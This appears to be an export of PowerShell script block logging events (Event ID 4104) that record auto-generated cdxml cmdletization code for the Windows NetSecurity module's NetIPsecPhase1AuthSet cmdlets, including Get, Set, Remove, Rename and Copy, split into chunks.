            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletization_methodParameter)

      $__cmdletization_returnValue = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{ Name = 'ReturnValue'; ParameterType = 'System.Int32'; Bindings = 'Error'; Value = $null; IsValuePresent = $false }
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('CloneObject', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Copy-NetIPsecPhase1AuthSet' -Alias '*'
        


ScriptBlock ID: b5b61c19-5fee-4904-981e-261652386372
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (3 of 4):
.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
      $__cmdletization_returnValue = $null
      $__cmdletization_methodInvocationInfo = [Microsoft.PowerShell.Cmdletization.MethodInvocationInfo]::new('cim:DeleteInstance', $__cmdletization_methodParameters, $__cmdletization_returnValue)
      $__cmdletization_passThru = $PSBoundParameters.ContainsKey('PassThru') -and $PassThru
            if ($PSBoundParameters.ContainsKey('InputObject')) {
                foreach ($x in $InputObject) { $__cmdletization_objectModelWrapper.ProcessRecord($x, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru) }
            } else {
                $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder, $__cmdletization_methodInvocationInfo, $__cmdletization_PassThru)
            }
        }
    }

            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Remove-NetIPsecPhase1AuthSet' -Alias '*'
        

function Rename-NetIPsecPhase1AuthSet
{
    [CmdletBinding(DefaultParameterSetName='GetAll', SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Description},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PrimaryStatus[]]
    ${PrimaryStatus},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${Status},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [string[]]
    ${PolicyStoreSource},

    [Parameter(ParameterSetName='ByQuery')]
    [ValidateNotNull()]
    [Microsoft.PowerShell.Cmdletization.GeneratedTypes.NetSecurity.PolicyStoreType[]]
    ${PolicyStoreSourceType},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetConSecRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecRule},

    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetMainModeRule')]
    [ValidateNotNull()]
    [ciminstance]
    ${AssociatedNetIPsecMainModeRule},

    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${All},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [switch]
    ${TracePolicyStore},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [Parameter(ParameterSetName='ByQuery', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule', Mandatory=$true)]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule', Mandatory=$true)]
    [Parameter(ParameterSetName='GetAll', Mandatory=$true)]
    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true)]
    [string]
    ${NewName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByQuery')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecRule')]
    [Parameter(ParameterSetName='ByAssociatedNetIPsecMainModeRule')]
    [Parameter(ParameterSetName='GetAll')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Description') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Description})
        $__cmdletization_queryBuilder.FilterByProperty('Description', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PrimaryStatus') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PrimaryStatus})
        $__cmdletization_queryBuilder.FilterByProperty('PrimaryStatus', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Status') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Status})
        $__cmdletization_queryBuilder.FilterByProperty('Status', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_methodParameters = [System.Collections.Generic.List[Microsoft.PowerShell.Cmdletization.MethodParameter]]::new()
    switch -exact ($PSCmdlet.ParameterSetName) { 
        { @('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll', 'InputObject (cdxml)') -contains $_ } {
          [object]$__cmdletization_defaultValue = $null
          [object]$__cmdletization_defaultValueIsPresent = $false
          if ($PSBoundParameters.ContainsKey('NewName')) {
            [object]$__cmdletization_value = ${NewName}
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_value; IsValuePresent = $true}
          } else {
            $__cmdletization_methodParameter = [Microsoft.PowerShell.Cmdletization.MethodParameter]@{Name = 'NewName'; ParameterType = 'System.String'; Bindings = 'In'; Value = $__cmdletization_defaultValue; IsValuePresent = $__cmdletization_defaultValueIsPresent}
          }
          $__cmdletization_methodParameters.Add($__cmdletizati

ScriptBlock ID: b5b61c19-5fee-4904-981e-261652386372
Path: "
"07-08-2025 18:31:34","4104","Warning","Creating Scriptblock text (2 of 4):
  if ($PSBoundParameters.ContainsKey('PolicyStoreSource') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSource})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSource', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStoreSourceType') -and (@('ByQuery') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${PolicyStoreSourceType})
        $__cmdletization_queryBuilder.FilterByProperty('PolicyStoreSourceType', $__cmdletization_values, $false, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecRule') -and (@('ByAssociatedNetIPsecRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecRule}, 'MSFT_NetConSecRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('AssociatedNetIPsecMainModeRule') -and (@('ByAssociatedNetIPsecMainModeRule') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.FilterByAssociatedInstance(${AssociatedNetIPsecMainModeRule}, 'MSFT_NetMainModeRuleMMAuthSet', 'GroupComponent', 'PartComponent', 'Default')
    }
    if ($PSBoundParameters.ContainsKey('All') -and (@('GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('All', ${All})
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
    if ($PSBoundParameters.ContainsKey('GPOSession') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('GPOSession', ${GPOSession})
    }
    if ($PSBoundParameters.ContainsKey('TracePolicyStore') -and (@('ByName', 'ByDisplayName', 'ByQuery', 'ByAssociatedNetIPsecRule', 'ByAssociatedNetIPsecMainModeRule', 'GetAll') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('TracePolicyStore', ${TracePolicyStore})
    }


    $__cmdletization_objectModelWrapper.ProcessRecord($__cmdletization_queryBuilder)
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    End {
        try
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper.EndProcessing()
            }
        }
        catch
        {
            throw
        }
    }

    # .EXTERNALHELP NetIPsecPhase1AuthSet.cmdletDefinition.cdxml-Help.xml
}
Microsoft.PowerShell.Core\Export-ModuleMember -Function 'Get-NetIPsecPhase1AuthSet' -Alias '*'
        

function Set-NetIPsecPhase1AuthSet
{
    [CmdletBinding(SupportsShouldProcess=$true, ConfirmImpact='Medium', PositionalBinding=$false)]
    
    [OutputType([Microsoft.Management.Infrastructure.CimInstance])]
[OutputType('Microsoft.Management.Infrastructure.CimInstance#root/standardcimv2/MSFT_NetIKEP1AuthSet')]

    param(
    
    [Parameter(ParameterSetName='ByName', Mandatory=$true, Position=0)]
    [Alias('ID')]
    [ValidateNotNull()]
    [string[]]
    ${Name},

    [Parameter(ParameterSetName='ByDisplayName', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayName},

    [Parameter(ParameterSetName='ByDisplayGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${DisplayGroup},

    [Parameter(ParameterSetName='ByGroup', Mandatory=$true)]
    [ValidateNotNull()]
    [string[]]
    ${Group},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${PolicyStore},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [string]
    ${GPOSession},

    [Parameter(ParameterSetName='InputObject (cdxml)', Mandatory=$true, ValueFromPipeline=$true)]
    [PSTypeName('Microsoft.Management.Infrastructure.CimInstance#MSFT_NetIKEP1AuthSet')]
    [ValidateNotNull()]
    [ciminstance[]]
    ${InputObject},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${NewDisplayName},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [string]
    ${Description},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [ciminstance[]]
    ${Proposal},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [Alias('Session')]
    [ValidateNotNullOrEmpty()]
    [CimSession[]]
    ${CimSession},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [int]
    ${ThrottleLimit},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${AsJob},

    [Parameter(ParameterSetName='ByName')]
    [Parameter(ParameterSetName='ByDisplayName')]
    [Parameter(ParameterSetName='ByDisplayGroup')]
    [Parameter(ParameterSetName='ByGroup')]
    [Parameter(ParameterSetName='InputObject (cdxml)')]
    [switch]
    ${PassThru})

    DynamicParam {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
                $__cmdletization_objectModelWrapper = $script:ObjectModelWrapper::new()
                $__cmdletization_objectModelWrapper.Initialize($PSCmdlet, $script:ClassName, $script:ClassVersion, $script:ModuleVersion, $script:PrivateData)

                if ($__cmdletization_objectModelWrapper -is [System.Management.Automation.IDynamicParameters])
                {
                    ([System.Management.Automation.IDynamicParameters]$__cmdletization_objectModelWrapper).GetDynamicParameters()
                }
            }
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }

    Begin {
        $__cmdletization_exceptionHasBeenThrown = $false
        try 
        {
            __cmdletization_BindCommonParameters $__cmdletization_objectModelWrapper $PSBoundParameters
            $__cmdletization_objectModelWrapper.BeginProcessing()
        }
        catch
        {
            $__cmdletization_exceptionHasBeenThrown = $true
            throw
        }
    }
        

    Process {
        try 
        {
            if (-not $__cmdletization_exceptionHasBeenThrown)
            {
    $__cmdletization_queryBuilder = $__cmdletization_objectModelWrapper.GetQueryBuilder()
    if ($PSBoundParameters.ContainsKey('Name') -and (@('ByName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Name})
        $__cmdletization_queryBuilder.FilterByProperty('InstanceID', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayName') -and (@('ByDisplayName') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayName})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayName', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('DisplayGroup') -and (@('ByDisplayGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${DisplayGroup})
        $__cmdletization_queryBuilder.FilterByProperty('DisplayGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('Group') -and (@('ByGroup') -contains $PSCmdlet.ParameterSetName )) {
        $__cmdletization_values = @(${Group})
        $__cmdletization_queryBuilder.FilterByProperty('RuleGroup', $__cmdletization_values, $true, 'Default')
    }
    if ($PSBoundParameters.ContainsKey('PolicyStore') -and (@('ByName', 'ByDisplayName', 'ByDisplayGroup', 'ByGroup') -contains $PSCmdlet.ParameterSetName )) {
    $__cmdletization_queryBuilder.AddQueryOption('PolicyStore', ${PolicyStore})
    }
